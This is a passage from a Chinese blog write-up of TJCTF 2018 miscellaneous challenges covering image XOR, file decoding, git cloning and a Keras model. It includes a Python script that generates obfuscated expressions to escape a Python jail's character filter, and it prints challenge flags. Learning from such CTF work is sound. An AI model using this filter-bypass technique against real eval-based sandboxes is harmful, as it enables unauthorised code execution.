<p>额，就是Image Combiner 下，取其SUB的图像保存，再将其与v1.png或者v2.png再次进行XOR，会得到以下图片</p>
<p><img src="/2018/08/13/tjctf2018/1534248728162.png" alt="1534248728162"></p>
<p>嗯，没错，在反色下扫扫二维码得到tjctf{m1x1ing_and_m4tchIng_1m4g3s_15_fun} </p>
<p>额。理解可以这样<code>flag=NOT（ (v1 SUB V2) Xor v1）</code></p>
<h5 id="Miscellaneous-Nothing-but-Everything"><a href="#Miscellaneous-Nothing-but-Everything" class="headerlink" title="Miscellaneous_Nothing but Everything"></a>Miscellaneous_Nothing but Everything</h5><p><img src="/2018/08/13/tjctf2018/1534247454700.png" alt="1534247454700"></p>
<p>虽然这题，只有区区的20分，但是，这是觉得贼有意思的题目，题目给了一个压缩包，解压，浏览下全是数字</p>
<p><img src="/2018/08/13/tjctf2018/1534255658541.png" alt="1534255658541"></p>
<p>打开其中的HAHAHA.txt</p>
<p><img src="/2018/08/13/tjctf2018/1534255714001.png" alt="1534255714001"></p>
<p>……再看看其他的文件，里面都是数字</p>
<p>卡了好久，比赛第三天才想到，数字，那转16进制，再转ASCII试试</p>
<p><img src="/2018/08/13/tjctf2018/1534253039430.png" alt="1534253039430"></p>
<p>em~</p>
<p>好像懂了，看样子要写个脚本哦。。。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">d_root = <span class="string">'1262404985085867488371'</span>	<span class="comment">#root dir</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_sixteen_ascii</span><span class="params">(number)</span>:</span>	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> hex(int(number))[<span class="number">2</span>:].replace(<span class="string">'L'</span>,<span class="string">''</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">os.chdir(d_root+)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">'.'</span>):		<span class="comment">#list dir</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">		<span class="keyword">print</span> operate_sixteen_ascii(i)</span><br><span class="line"></span><br><span class="line">		c=open(i).read()</span><br><span class="line"></span><br><span class="line">		open(operate_sixteen_ascii(i),<span class="string">'w'</span>).write(operate_sixteen_ascii(c))	<span class="comment">#decrypt file</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line">		<span class="keyword">print</span> <span class="string">"Not successful --&gt; "</span>, i</span><br></pre></td></tr></table></figure>
<p>运行下，顺便看看有啥惊喜</p>
<p><img src="/2018/08/13/tjctf2018/1534256442662.png" alt="1534256442662"></p>
<p>多了两张图片，一个压缩包，暂时没有发现flag，试试两个子目录，改下上面相应的代码即可</p>
<p><code>os.chdir(d_root+&#39;/1466921579&#39;)</code></p>
<p>再找了找，就在这个子目录下一个xlsx文件下找到了flag</p>
<p><img src="/2018/08/13/tjctf2018/1534257098761.png" alt="1534257098761"></p>
<p>打开即可发现</p>
<p><img src="/2018/08/13/tjctf2018/1534256830926.png" alt="1534256830926"></p>
<h5 id="Miscellaneous-Huuuuuge"><a href="#Miscellaneous-Huuuuuge" class="headerlink" title="Miscellaneous_Huuuuuge"></a>Miscellaneous_Huuuuuge</h5><p><img src="/2018/08/13/tjctf2018/1534262213540.png" alt="1534262213540"></p>
<p>额。。。说实在打开这个网址，有种感觉像web，不出意外，打开是404，那就nmap扫扫咯。em~ ， git~9418</p>
<p><img src="/2018/08/13/tjctf2018/1534260174264.png" alt="1534260174264"></p>
<p>这里放个相关的<a href="https://git-scm.com/book/zh/v1/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84-Git-%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">git资料</a>链接，其中这里讲到了git-9418端口</p>
<p><img src="/2018/08/13/tjctf2018/1534262789278.png" alt="1534262789278"></p>
<p>实际上对于这题以下命令类型才能符合题目的原意：<code>git clone git://xxxxxxxx</code></p>
<p>好，我们按照如此格式先执行下<code>git clone git://104.154.187.226/huuuuuge</code></p>
<p><img src="/2018/08/13/tjctf2018/1534264233100.png" alt="1534264233100"></p>
<p>嗯？有东西，但是下不下来？？？</p>
<p>那在试试<code>git clone git://104.154.187.226/</code></p>
<p>这里有个注意的地方：<code>git clone git://104.154.187.226</code>这条命令跟上面是不一样的！！！对比结果如下</p>
<p><img src="/2018/08/13/tjctf2018/1534263359852.png" alt="1534263359852"></p>
<p>下载后，查看目录</p>
<p><img src="/2018/08/13/tjctf2018/1534263835448.png" alt="1534263835448"></p>
<p>。。。。。cat查看不了，后面把<code>this_is_not_the_flag.img</code>单独拿出来放入winhex,第一次见这种奇葩的东西</p>
<p><img src="/2018/08/13/tjctf2018/1534263724975.png" alt="1534263724975"></p>
<p>学习下</p>
<p><img src="/2018/08/13/tjctf2018/1534263982433.png" alt="1534263982433"></p>
<p>回到题目，还有另外一个目录，我们再看下包含的文件</p>
<p><img src="/2018/08/13/tjctf2018/1534264078584.png" alt="1534264078584"></p>
<p>。。。。什么鬼哦。。到这里卡住了</p>
<p>后面想想是不是应该往<code>git clone git://104.154.187.226/huuuuuge</code>这个地方想，网上搜索一番</p>
<p>找到个链接：<a href="https://stackoverflow.com/questions/2466735/how-to-checkout-only-one-file-from-git-repository-sparse-checkout" target="_blank" rel="noopener">https://stackoverflow.com/questions/2466735/how-to-checkout-only-one-file-from-git-repository-sparse-checkout</a></p>
<p><img src="/2018/08/13/tjctf2018/1534264536784.png" alt="1534264536784"></p>
<p>em~还有这种操作，只下载个别文件？按照这个命令是按depth来执行了，不管了，试试看<code>$ git clone -n git://104.154.187.226/huuuuuge --depth 1</code></p>
<p><img src="/2018/08/13/tjctf2018/1534265080004.png" alt="1534265080004"></p>
<p>然而，没用。再看了一遍帖子的第五点评论，搞鼓了下</p>
<p><img src="/2018/08/13/tjctf2018/1534265279305.png" alt="1534265279305"></p>
<p>倒是<code>$ git clone --depth=1 git://104.154.187.226/huuuuuge</code>竟然出来了，有点惊喜。</p>
<p><img src="/2018/08/13/tjctf2018/1534265181438.png" alt="1534265181438"></p>
<p>额。。。对于这两次看起来差不多的命令，导致的不同结果，还请师傅们指教。</p>
<h5 id="Miscellaneous-Learn-My-Flag"><a href="#Miscellaneous-Learn-My-Flag" class="headerlink" title="Miscellaneous_Learn My Flag"></a>Miscellaneous_Learn My Flag</h5><p><img src="/2018/08/13/tjctf2018/1534346794270.png" alt="1534346794270"></p>
<p>（这题会复杂许多，可以跳过此题，因为相当于从0学习机器学习等知识）</p>
<p>认真看题目，<code>mathcine learning</code>，em~……不会，怎么办？</p>
<p>先下载文件吧，file看看文件类型，看不懂，网上搜索一番</p>
<p><img src="/2018/08/13/tjctf2018/1534347300988.png" alt="1534347300988"></p>
<p>先简单概述下：</p>
<p>HDF 是用于存储和分发科学数据的一种自我描述、多对象文件格式。 额~不懂，没关系，先看看这个链接，了解下文件格式大概分哪几类，怎么分的，看其中的表即可：<code>http://poemunfinished.blog.163.com/blog/static/3208213220083333913937/</code></p>
<p>其中关于HDF文件的描述是这样的：</p>
<p><img src="/2018/08/13/tjctf2018/1534347432362.png" alt="1534347432362"></p>
<p>看完后，先记住下它是一种Scientific Data(科学数据)</p>
<p>这里再引用链接<code>https://blog.csdn.net/Mrhiuser/article/details/69603826</code>中的一个图，简单介绍下HDF5的文件组织（两种数据对象groups and datasets 这个得稍微记下）<img src="/2018/08/13/tjctf2018/1534348615891.png" alt="534348418775"></p>
<p>说起科学数据，参加过数学建模的童鞋，应该使用过MATLAB，额。。。大体的就不说了，其实建模就是对数据的一种科学分析。机器学习也是对数据的科学分析，将其数据的分析封存在HDF5中。</p>
<p>咳咳，扯回正题，其实这道题目就是让我们通过HDF5文件知识的认识和学习，剖析出使用的机器学习的算法及其他相关数据。问题来了，对于我这种菜鸡，额，短时间不可能全面贯通机器学习的内容，但是我们可以大概了解下机器学习的大致算法及一些相关性的知识。额，那这题怎么办呢。</p>
<p>继续引用下某位<a href="https://litna.top/2018/07/16/2018%E7%9C%8B%E9%9B%AA%C2%B7%E4%BA%AC%E4%B8%9CAI-CTF%E5%A4%A7%E6%8C%91%E6%88%98%E7%89%B9%E5%88%AB%E9%A2%98-writeup/" target="_blank" rel="noopener">大佬</a>的链接：</p>
<p>你会看到第一部分是大佬对HDF5文件剖析的python脚本，偷来用用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> h5py</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_dateset</span><span class="params">(name,d)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> type(d).__name__ == <span class="string">"Group"</span>:</span><br><span class="line">        print(<span class="string">"      &#123;&#125;"</span>.format(name))</span><br><span class="line">        <span class="keyword">for</span> name1, d1 <span class="keyword">in</span> d.items():</span><br><span class="line">            print_dateset(name1,d1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"      &#123;&#125;: &#123;&#125;"</span>.format(name, d.value.shape)) <span class="comment"># 输出储存在Dataset中的层名称和权重</span></span><br><span class="line">        print(<span class="string">"      &#123;&#125;: &#123;&#125;"</span>.format(name, d.value))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_keras_wegiths</span><span class="params">(weight_file_path)</span>:</span></span><br><span class="line">    f = h5py.File(weight_file_path)  <span class="comment"># 读取weights h5文件返回File类</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> len(f.attrs.items()):</span><br><span class="line">            print(<span class="string">"&#123;&#125; contains: "</span>.format(weight_file_path))</span><br><span class="line">            print(<span class="string">"Root attributes:"</span>)</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> f.attrs.items():</span><br><span class="line">            print(<span class="string">"  &#123;&#125;: &#123;&#125;"</span>.format(key, value))  <span class="comment"># 输出储存在File类中的attrs信息，一般是各层的名称</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> layer, g <span class="keyword">in</span> f.items():  <span class="comment"># 读取各层的名称以及包含层信息的Group类</span></span><br><span class="line">            print(<span class="string">"  &#123;&#125;"</span>.format(layer))</span><br><span class="line">            print(<span class="string">"    Attributes:"</span>)</span><br><span class="line">            <span class="keyword">for</span> key, value <span class="keyword">in</span> g.attrs.items(): <span class="comment"># 输出储存在Group类中的attrs信息，一般是各层的weights和bias及他们的名称</span></span><br><span class="line">                print(<span class="string">"      &#123;&#125;: &#123;&#125;"</span>.format(key, value))</span><br><span class="line"></span><br><span class="line">            print(<span class="string">"    Dataset:"</span>)</span><br><span class="line">            <span class="keyword">for</span> name, d <span class="keyword">in</span> g.items(): <span class="comment"># 读取各层储存具体信息的Dataset类</span></span><br><span class="line">                print_dateset(name,d)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure>
<p>尾部加个调用函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_keras_wegiths(&quot;learn_my_flag&quot;)</span><br></pre></td></tr></table></figure>
<p>运行下，截取了一些结果</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&gt; C:\Users\YF\Desktop\tjctf 2018\learn_my_flag&gt;py -3 decrypt_learn_my_flag.py</span><br><span class="line">&gt; learn_my_flag contains:</span><br><span class="line">&gt; Root attributes:</span><br><span class="line">&gt;   keras_version: b&apos;2.2.0&apos;			</span><br><span class="line">&gt;   backend: b&apos;tensorflow&apos;</span><br><span class="line">&gt;   model_config: b&apos;&#123;&quot;class_name&quot;: &quot;Sequential&quot;, &quot;config&quot;: [&#123;&quot;class_name&quot;: &quot;Dense&quot;, &quot;config&quot;: &#123;&quot;name&quot;: &quot;dense_1&quot;, &quot;trainable&quot;: true, &quot;batch_input_shape&quot;: [null, 1], &quot;dtype&quot;: &quot;float32&quot;, &quot;units&quot;: 16, &quot;activation&quot;: &quot;relu&quot;, &quot;use_bias&quot;: true, &quot;kernel_initializer&quot;: &#123;&quot;class_name&quot;: &quot;VarianceScaling&quot;, &quot;config&quot;: &#123;&quot;scale&quot;: 1.0, &quot;mode&quot;: &quot;fan_avg&quot;, &quot;distribution&quot;: &quot;uniform&quot;, &quot;seed&quot;: null&#125;&#125;, &quot;bias_initializer&quot;: &#123;&quot;class_name&quot;: &quot;Zeros&quot;, &quot;config&quot;: &#123;&#125;&#125;, &quot;kernel_regularizer&quot;: null, &quot;bias_regularizer&quot;: null, &quot;activity_regularizer&quot;: null, &quot;kernel_constraint&quot;: null, &quot;bias_constraint&quot;: null&#125;&#125;, &#123;&quot;class_name&quot;: &quot;Dense&quot;, &quot;config&quot;: &#123;&quot;name&quot;: &quot;dense_2&quot;, &quot;trainable&quot;: true, &quot;units&quot;: 12700, &quot;activation&quot;: &quot;linear&quot;, &quot;use_bias&quot;: true, &quot;kernel_initializer&quot;: &#123;&quot;class_name&quot;: &quot;VarianceScaling&quot;, &quot;config&quot;: &#123;&quot;scale&quot;: 1.0, &quot;mode&quot;: &quot;fan_avg&quot;, &quot;distribution&quot;: &quot;uniform&quot;, &quot;seed&quot;: null&#125;&#125;, &quot;bias_initializer&quot;: &#123;&quot;class_name&quot;: &quot;Zeros&quot;, &quot;config&quot;: &#123;&#125;&#125;, &quot;kernel_regularizer&quot;: null, &quot;bias_regularizer&quot;: null, &quot;activity_regularizer&quot;: null, &quot;kernel_constraint&quot;: null, &quot;bias_constraint&quot;: null&#125;&#125;, &#123;&quot;class_name&quot;: &quot;Activation&quot;, &quot;config&quot;: &#123;&quot;name&quot;: &quot;activation_1&quot;, &quot;trainable&quot;: true, &quot;activation&quot;: &quot;sigmoid&quot;&#125;&#125;, &#123;&quot;class_name&quot;: &quot;Reshape&quot;, &quot;config&quot;: &#123;&quot;name&quot;: &quot;reshape_1&quot;, &quot;trainable&quot;: true, &quot;target_shape&quot;: [50, 254]&#125;&#125;]&#125;&apos;</span><br><span class="line">&gt;   training_config: b&apos;&#123;&quot;optimizer_config&quot;: &#123;&quot;class_name&quot;: &quot;Adam&quot;, &quot;config&quot;: &#123;&quot;lr&quot;: 0.0010000000474974513, &quot;beta_1&quot;: 0.8999999761581421, &quot;beta_2&quot;: 0.9990000128746033, &quot;decay&quot;: 0.0, &quot;epsilon&quot;: 1e-07, &quot;amsgrad&quot;: false&#125;&#125;, &quot;loss&quot;: &quot;binary_crossentropy&quot;, &quot;metrics&quot;: [&quot;accuracy&quot;, &quot;mae&quot;], &quot;sample_weight_mode&quot;: null, &quot;loss_weights&quot;: null&#125;&apos;</span><br><span class="line">&gt;   model_weights</span><br><span class="line">&gt;     Attributes:</span><br><span class="line">&gt;       layer_names: [b&apos;dense_1&apos; b&apos;dense_2&apos; b&apos;activation_1&apos; b&apos;reshape_1&apos;]</span><br><span class="line">&gt;       backend: b&apos;tensorflow&apos;</span><br><span class="line">&gt;       keras_version: b&apos;2.2.0&apos;</span><br><span class="line">&gt;     Dataset:</span><br><span class="line">&gt;       activation_1</span><br><span class="line">&gt;       dense_1</span><br><span class="line">&gt;       dense_1</span><br><span class="line">&gt; .............</span><br><span class="line">&gt; .............</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>模型是基于tensorflow工具的keras框架生成的 ,em~,然后这里先铺个垫，上面有一句话给了特别的提示：</p>
<p> <code>{&quot;class_name&quot;: &quot;Reshape&quot;, &quot;config&quot;: {&quot;name&quot;: &quot;reshape_1&quot;, &quot;trainable&quot;: true, &quot;target_shape&quot;: [50, 254]}}]}&#39;</code>，给了<code>&quot;target_shape&quot;: [50, 254]</code>，这跟最终的解题脚本里的<code>output = output.reshape(50,254)</code>相照应。</p>
<p>嗯，咱们继续做题，然后呢。。。。我发现还是不会，那继续找资料啊。em~一波寻找，找到个相似的<a href="https://blog.csdn.net/dcrmg/article/details/79165995" target="_blank" rel="noopener">学习链接</a>。</p>
<p>学习，不断学习，终于靠着“愚公精神”写出来了代码（仔细看代码注释）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> load_model</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line">os.environ[<span class="string">'TF_CPP_MIN_LOG_LEVEL'</span>] = <span class="string">'2'</span> </span><br><span class="line"></span><br><span class="line">model = load_model(<span class="string">'learn_my_flag'</span>)</span><br><span class="line"></span><br><span class="line">num=np.array([<span class="number">1</span>])</span><br><span class="line">output = model.predict(num)</span><br><span class="line">print(output.shape)</span><br><span class="line"></span><br><span class="line">output = output.reshape(<span class="number">50</span>,<span class="number">254</span>)</span><br><span class="line">plt.imshow(output,cmap = <span class="string">'gray'</span>)	<span class="comment">#函数负责对图像进行处理，并显示其格式</span></span><br><span class="line">plt.show()		<span class="comment">#将plt.imshow()处理后的函数显示出来</span></span><br></pre></td></tr></table></figure>
<p>运行，得到答案</p>
<p><img src="/2018/08/13/tjctf2018/1534355168624.png" alt="1534355168624"></p>
<p>坑点一：<code>Your CPU supports instructions that this TensorFlow binary was not compiled to use: AVX2 FMA</code></p>
<p><img src="/2018/08/13/tjctf2018/1534353106260.png" alt="1534353106260"></p>
<p>解决办法：</p>
<p><img src="/2018/08/13/tjctf2018/1534353131189.png" alt="1534353131189"></p>
<p>引用链接来自：<a href="https://blog.csdn.net/hq86937375/article/details/79696023" target="_blank" rel="noopener">https://blog.csdn.net/hq86937375/article/details/79696023</a></p>
<p>坑点二：python的引用包的配置</p>
<p>这里给大家一点建议，凡是以后对科学数据的分析，比如机器学习啥啥啥的，最好使用<code>python3.6</code>的版本,只是建议啊，个人觉得这些应用包七七八八的错误更少。对此题而言，使用的是<code>python3.6+windows</code></p>
<p>最后的解题脚本运行前，进行了下列操作：</p>
<p><code>pip3.6 install matplotlib</code><br><code>pip3.6 install keras</code><br><code>pip3.6 install tensorflow</code></p>
<p>这题给的惊喜很大，虽然只有区区30分，但是非常锻炼学习能力，坑多啊。</p>
<h5 id="Miscellaneous-Mirror-Mirror"><a href="#Miscellaneous-Mirror-Mirror" class="headerlink" title="Miscellaneous_Mirror Mirror"></a>Miscellaneous_Mirror Mirror</h5><p><img src="/2018/08/13/tjctf2018/1534356504336.png" alt="1534356504336"></p>
<p>这题有点难度跟分数成反比。。。这题，额，百度下资料，下方提供了一些基本的学习资料，建议先看看，不然估计会蒙蔽:</p>
<p><a href="http://www.360zhijia.com/360anquanke/178589.html" target="_blank" rel="noopener">http://www.360zhijia.com/360anquanke/178589.html</a></p>
<p><a href="http://python.jobbole.com/89232/?utm_source=blog.jobbole.com&amp;utm_medium=relatedPosts" target="_blank" rel="noopener">http://python.jobbole.com/89232/?utm_source=blog.jobbole.com&amp;utm_medium=relatedPosts</a></p>
<p>下面演示下解题流程：</p>
<p>nc连接，了解题意，需要我们<code>get_flag()</code>最后的<code>flag</code></p>
<p><img src="/2018/08/13/tjctf2018/1534400079069.png" alt="1534400079069"></p>
<p>嗯，疯狂试探一波dir()，type()</p>
<p><img src="/2018/08/13/tjctf2018/1534400328991.png" alt="1534400328991"></p>
<p>卧槽，直接看到了<code>func_code</code>,来测试下<code>get_flag</code></p>
<p><img src="/2018/08/13/tjctf2018/1534401201039.png" alt="1534401201039"></p>
<p>看到这一行<code>if(eval(input) == super_secret_string):</code>，关键点<code>super_secret_string</code>，感觉有戏，继续深入</p>
<p><img src="/2018/08/13/tjctf2018/1534401772040.png" alt="1534401772040"></p>
<p>不出所料，<code>&quot;co_xxxxxx&quot;</code>出现了，尝试提取co_code,不过失败了（这里有个坑点，感兴趣的可以留言讨论）</p>
<p>不过，co_consts、co_varnames分别得到了这么两行数据</p>
<p><img src="/2018/08/13/tjctf2018/1534402938340.png" alt="1534402938340"></p>
<p><code>(None, &#39;this_is_the_super_secret_string&#39;, 48, 57, 65, 90, 97, 122, 44, 95, &#39; is not a valid character&#39;, &#39;%\xcb&#39;, &quot;You didn&#39;t guess the value of my super_secret_string&quot;)</code></p>
<p><code>(&#39;input&#39;, &#39;super_secret_string&#39;, &#39;each&#39;, &#39;val&#39;)</code></p>
<p>这个第二行的数据跟上面的关键点<code>super_secret_string</code>想照应。。但是到这里就卡壳了。</p>
<p>知道了这么多但是不知道如何利用。。。这有点尴尬，好在后面组队的小伙伴做出来了，给我发了个网址</p>
<p><a href="http://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape/" target="_blank" rel="noopener">http://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape/</a></p>
<p>学习下脚本，稍稍修改运行下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brainfuckize</span><span class="params">(nb)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> nb <span class="keyword">in</span> [<span class="number">-2</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">"~(&#123;&#125;&lt;[])"</span>, <span class="string">"~([]&lt;[])"</span>,</span><br><span class="line">                 <span class="string">"([]&lt;[])"</span>,  <span class="string">"(&#123;&#125;&lt;[])"</span>][nb+<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> nb % <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"~%s"</span> % brainfuckize(~nb)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"(%s&lt;&lt;(&#123;&#125;&lt;[]))"</span> % brainfuckize(nb/<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_chr</span><span class="params">(num)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">"`'%\\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))]%("</span> + brainfuckize(num) + <span class="string">")"</span>	<span class="comment">#注意是\\</span></span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	super_secret_string=<span class="string">"this_is_the_super_secret_string"</span></span><br><span class="line">	result = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> super_secret_string:</span><br><span class="line">		result+= operate_chr(ord(i))</span><br><span class="line">		result+=<span class="string">'+'</span></span><br><span class="line">	result = result[:<span class="number">-1</span>]</span><br><span class="line">	<span class="keyword">print</span> result</span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
<p>测试下数据是否是<code>this_is_the_super_secret_string</code>，get_flag()读取即可</p>
<p><img src="/2018/08/13/tjctf2018/1534405699551.png" alt="1534405699551"></p>
<p><img src="/2018/08/13/tjctf2018/1534405633567.png" alt="1534405633567"></p>
<p>到这里就完毕啦，谢谢大家，学到的还是挺多的，继续努力咯，共勉！附件随后留言处上传！<code>^___^</code></p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/ctf/" rel="tag"># ctf</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2018/08/12/hello-world/" rel="next" title="博客正式上新 2018.08.12">
                <i class="fa fa-chevron-left"></i> 博客正式上新 2018.08.12
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2018/08/17/2018的七夕节/" rel="prev" title="2018的七夕节">
                2018的七夕节 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/person_image.jpg"
                alt="jianghuxia" />
            
              <p class="site-author-name" itemprop="name">jianghuxia</p>
              <p class="site-description motion-element" itemprop="description">Stay Hungry. Stay Foolish.</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">29</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">12</span>
                  <span class="site-state-item-name">标签</span>
                
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web:</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Web-Bank"><span class="nav-number">1.1.</span> <span class="nav-text">Web_Bank</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Web-Cookie-Monster"><span class="nav-number">1.2.</span> <span class="nav-text">Web_Cookie Monster</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Web-Central-Savings-Account"><span class="nav-number">1.3.</span> <span class="nav-text">Web_Central Savings Account</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Web-Programmable-Hyperlinked-Pasta"><span class="nav-number">1.4.</span> <span class="nav-text">Web_Programmable Hyperlinked Pasta</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Web-Request-Me"><span 